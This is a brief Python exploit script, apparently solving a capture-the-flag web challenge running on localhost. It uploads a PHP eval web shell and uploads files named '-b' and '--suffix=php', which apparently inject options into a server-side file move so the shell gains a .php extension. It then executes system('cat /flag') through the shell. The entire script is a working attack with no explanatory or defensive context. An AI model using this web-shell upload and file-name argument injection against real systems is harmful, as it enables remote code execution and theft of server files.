import requests

url = "http://127.0.0.1:8080"

def upload_file(filename, content):
    post_file = {
        "files[]": (filename, content, "application/octet-stream")
    }

    post_data = {
        "upload": "1"
    }

    res = requests.post(url, files=post_file,data=post_data)
    return res.text

def move_file():
    post_data = {
        "confirm_move": "1"
    }
    res = requests.post(url, data=post_data)
    return res.text

def rce(cmd):
    res = requests.post(url+"/upload/shell.php", data={"cmd": cmd})
    return res.text

if __name__ == "__main__":
    upload_file("shell.", b"<?php eval($_POST['cmd']); ?>")
    move_file()

    upload_file("shell.", b"")
    upload_file("-b", b"")
    upload_file("--suffix=php", b"")
    move_file()

    flag = rce("system('cat /flag');")
    print(flag)